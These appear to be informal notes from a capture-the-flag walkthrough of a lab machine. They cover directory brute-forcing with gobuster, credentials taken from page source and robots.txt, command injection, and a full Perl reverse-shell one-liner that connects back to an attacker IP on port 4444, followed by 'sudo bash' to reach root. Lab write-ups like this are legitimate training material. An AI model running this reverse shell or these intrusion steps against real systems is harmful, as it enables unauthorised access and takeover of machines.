
gobuster dir -u http://workers.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,php3,html,txt       => brute force for dir

I see the place for command injection

username => R1ckRul3s   / i got from source code
password  => Wubbalubbadubdub / i got feom robots.txt

grep -R .   => i inject like this


=> I use this payload to get exploit

perl -e 'use Socket;$i="10.14.39.103";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


![[Pasted image 20230115195040.png]]

I got root hit form here 

sudo bash    or sudo su
cd /root  => i got root from here